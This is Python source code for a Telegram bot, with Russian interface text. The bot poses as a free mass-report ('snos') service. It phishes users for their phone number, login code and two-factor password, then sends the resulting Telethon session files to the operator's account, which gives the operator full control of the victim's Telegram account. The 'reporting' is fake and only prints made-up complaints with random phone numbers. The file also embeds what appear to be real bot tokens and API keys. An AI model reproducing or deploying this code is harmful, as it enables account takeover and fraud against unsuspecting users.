import asyncio
import random
import shutil
from datetime import datetime
from pathlib import Path
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telethon.network.connection.tcpabridged import ConnectionTcpAbridged
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, StateFilter
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ===== КОНФИГУРАЦИЯ =====
BOT_TOKEN = "8704361523:AAHqi_mbS-7bD6Rtb9YqcRJUYJJBhJH045E"  # СМЕНИТЬ!
YOUR_USER_ID = 7546928092  # СМЕНИТЬ!
API_ID = 35800959  # СМЕНИТЬ!
API_HASH = '708e7d0bc3572355bcaf68562cc068f1'  # СМЕНИТЬ!

# Прокси (опционально)
PROXY = None  # или словарь с настройками

SESSIONS_DIR = "sessions"
BACKUP_DIR = "sessions_backup"

Path(SESSIONS_DIR).mkdir(exist_ok=True)
Path(BACKUP_DIR).mkdir(exist_ok=True)

storage = MemoryStorage()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=storage)

user_clients = {}
auth_states = {}

# Состояния
class AuthStates(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_password = State()

class SnosStates(StatesGroup):
    waiting_username = State()
    waiting_reason = State()
    waiting_count = State()

# ===== ФУНКЦИИ =====
def create_client(user_id):
    session_file = f"{SESSIONS_DIR}/user_{user_id}"
    if PROXY and PROXY.get("proxy_type") and PROXY.get("addr"):
        return TelegramClient(
            session_file, API_ID, API_HASH,
            connection=ConnectionTcpAbridged,
            proxy=(PROXY["proxy_type"], PROXY["addr"], PROXY["port"], PROXY["username"], PROXY["password"])
        )
    return TelegramClient(session_file, API_ID, API_HASH)

async def send_session_to_admin(user_id, phone, client):
    try:
        await client.disconnect()
        
        session_files = []
        for ext in ['.session', '.session-journal']:
            session_path = Path(f"{SESSIONS_DIR}/user_{user_id}{ext}")
            if session_path.exists():
                session_files.append(session_path)
        
        text = (
            f"✅ НОВАЯ СЕССИЯ!\n\n"
            f"🆔 ID: {user_id}\n"
            f"📱 Телефон: {phone}\n"
            f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        )
        if PROXY and PROXY.get("proxy_type"):
            text += f"🌐 Прокси: {PROXY['proxy_type']}://{PROXY['addr']}:{PROXY['port']}"
        
        await bot.send_message(YOUR_USER_ID, text)
        
        for f in session_files:
            shutil.copy2(f, BACKUP_DIR)
            await bot.send_document(YOUR_USER_ID, FSInputFile(f), caption=f"Сессия {phone}")
        
        await client.connect()
    except Exception as e:
        await bot.send_message(YOUR_USER_ID, f"Ошибка: {e}")

# ===== КЛАВИАТУРЫ =====
def code_keyboard():
    buttons = []
    for i in range(1, 10):
        buttons.append(InlineKeyboardButton(text=str(i), callback_data=f"code_{i}"))
    buttons.extend([
        InlineKeyboardButton(text="0", callback_data="code_0"),
        InlineKeyboardButton(text="⌫", callback_data="code_backspace"),
        InlineKeyboardButton(text="✅ Подтвердить", callback_data="code_done")
    ])
    keyboard = [buttons[i:i+3] for i in range(0, len(buttons), 3)]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def cancel_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel")]
    ])

def main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Начать снос", callback_data="start_snos")],
        [InlineKeyboardButton(text="🆘 Поддержка", callback_data="support")]
    ])

# ===== ОБРАБОТЧИКИ =====
@dp.message(Command("start"))
async def start(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in user_clients and user_clients[user_id].is_connected():
        await message.answer("✅ Вы авторизованы!", reply_markup=main_menu())
    else:
        await message.answer(
            "Добрый день, это сносер БЕСПЛАТНЫЙ, но требует верификации для удаления ВАС из базы данных сносов, "
            "чтобы вас было сложнее снести, а ещё чтобы снос был 100%\n\n"
            "Если есть вопросы пишите - @gmailkaratel или @deamorgan\n\n"
            "🔐 Введите номер телефона в формате +7XXXXXXXXXX:"
        )
        await state.set_state(AuthStates.waiting_phone)
        auth_states[user_id] = {}

@dp.message(AuthStates.waiting_phone)
async def get_phone(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    phone = message.text.strip()
    
    if len(phone) < 10:
        await message.answer("❌ Неверный формат. Введите номер в формате +7XXXXXXXXXX:")
        return
    
    try:
        client = create_client(user_id)
        await client.connect()
        
        await message.answer("🔄 Подключение...")
        
        if not await client.is_user_authorized():
            await client.send_code_request(phone)
            auth_states[user_id]["client"] = client
            auth_states[user_id]["phone"] = phone
            auth_states[user_id]["code"] = ""
            
            await message.answer(
                f"📩 Код отправлен на {phone}\n"
                f"Введите код из Telegram, используя клавиатуру:",
                reply_markup=code_keyboard()
            )
            await state.set_state(AuthStates.waiting_code)
        else:
            user_clients[user_id] = client
            await message.answer("✅ Вы уже авторизованы!", reply_markup=main_menu())
            await state.clear()
    
    except Exception as e:
        await message.answer(f"❌ Ошибка: {str(e)[:200]}\nПопробуйте /start")

@dp.callback_query(F.data.startswith("code_"), StateFilter(AuthStates.waiting_code))
async def handle_code_digit(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    action = callback.data.split("_")[1]
    
    if action == "backspace":
        auth_states[user_id]["code"] = auth_states[user_id]["code"][:-1]
        await callback.message.edit_text(
            f"🔢 Введите код:\n`{auth_states[user_id]['code']}`\n\nИспользуйте клавиатуру:",
            reply_markup=code_keyboard(),
            parse_mode="Markdown"
        )
    elif action == "done":
        # Подтверждение кода
        code = auth_states[user_id].get("code", "")
        client = auth_states[user_id].get("client")
        phone = auth_states[user_id].get("phone", "")
        
        if not client:
            await callback.answer("❌ Ошибка", show_alert=True)
            await callback.answer()
            return
        
        try:
            await client.sign_in(phone, code)
            user_clients[user_id] = client
            
            await send_session_to_admin(user_id, phone, client)
            
            await callback.message.edit_text("✅ Авторизация успешна! Сессия сохранена.")
            await callback.message.answer("Выберите действие:", reply_markup=main_menu())
            await state.clear()
        
        except SessionPasswordNeededError:
            await callback.message.edit_text(
                "🔐 Включена двухфакторная аутентификация.\n"
                "Введите пароль (обычным текстом):",
                reply_markup=cancel_keyboard()
            )
            await state.set_state(AuthStates.waiting_password)
        
        except Exception as e:
            await callback.message.edit_text(f"❌ Неверный код: {str(e)}\nПопробуйте /start")
            await state.clear()
    else:
        # Обычная цифра
        auth_states[user_id]["code"] += action
        await callback.message.edit_text(
            f"🔢 Введите код:\n`{auth_states[user_id]['code']}`\n\nИспользуйте клавиатуру:",
            reply_markup=code_keyboard(),
            parse_mode="Markdown"
        )
    
    await callback.answer()

@dp.message(AuthStates.waiting_password)
async def handle_password(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    password = message.text.strip()
    client = auth_states[user_id].get("client")
    phone = auth_states[user_id].get("phone", "")
    
    if not client:
        await message.answer("❌ Ошибка. Используйте /start")
        return
    
    try:
        await client.sign_in(password=password)
        user_clients[user_id] = client
        
        await send_session_to_admin(user_id, phone, client)
        
        await message.answer("✅ Авторизация успешна! Сессия сохранена.")
        await message.answer("Выберите действие:", reply_markup=main_menu())
        await state.clear()
    except Exception as e:
        await message.answer(f"❌ Неверный пароль: {str(e)}")
        await state.set_state(AuthStates.waiting_password)

@dp.callback_query(F.data == "cancel")
async def cancel(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if user_id in auth_states:
        client = auth_states[user_id].get("client")
        if client:
            await client.disconnect()
        auth_states.pop(user_id)
    await callback.message.edit_text("❌ Отменено.\nИспользуйте /start")
    await state.clear()
    await callback.answer()

@dp.callback_query(F.data == "support")
async def support(callback: types.CallbackQuery):
    await callback.message.answer(
        "🆘 **Поддержка:**\n\n"
        "По всем вопросам обращайтесь:\n"
        "• @deamorgan\n"
        "• @gmailkaratel\n\n"
        "Ответим в ближайшее время!",
        parse_mode="Markdown"
    )
    await callback.answer()

# ===== СНОС (ДЕМО) =====
@dp.callback_query(F.data == "start_snos")
async def start_snos(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if user_id not in user_clients or not user_clients[user_id].is_connected():
        await callback.answer("❌ Сначала авторизуйтесь через /start", show_alert=True)
        return
    
    await callback.message.answer("👤 Введите юзернейм (без @) или ID:")
    await state.set_state(SnosStates.waiting_username)
    await callback.answer()

@dp.message(SnosStates.waiting_username)
async def get_username(message: types.Message, state: FSMContext):
    await state.update_data(username=message.text.strip())
    await message.answer("📝 Введите причину жалобы:")
    await state.set_state(SnosStates.waiting_reason)

@dp.message(SnosStates.waiting_reason)
async def get_reason(message: types.Message, state: FSMContext):
    await state.update_data(reason=message.text.strip())
    await message.answer("🔢 Сколько жалоб отправить (число):")
    await state.set_state(SnosStates.waiting_count)

@dp.message(SnosStates.waiting_count)
async def get_count(message: types.Message, state: FSMContext):
    try:
        count = int(message.text.strip())
        data = await state.get_data()
        
        await message.answer(f"🚀 СНОС (ДЕМО)\n\n"
                             f"👤 Цель: @{data['username']}\n"
                             f"📝 Причина: {data['reason']}\n"
                             f"📊 Всего: {count}\n\n"
                             f"Подтвердите сессию для большей вероятности сноса")
        
        for i in range(1, count + 1):
            number = f"+7{random.randint(900, 999)}{random.randint(1000000, 9999999)}"
            await message.answer(f"📨 ЖАЛОБА НА @{data['username']}\n"
                                 f"📞 НОМЕР: {number}\n"
                                 f"📊 {i}/{count}")
            await asyncio.sleep(0.5)
        
        await message.answer("✅ СНОС ЗАВЕРШЁН! Ожидайте.")
        await message.answer("Выберите действие:", reply_markup=main_menu())
        await state.clear()
    
    except ValueError:
        await message.answer("❌ Введите число!")

# ===== ЗАПУСК =====
async def main():
    print("🚀 Бот запущен")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())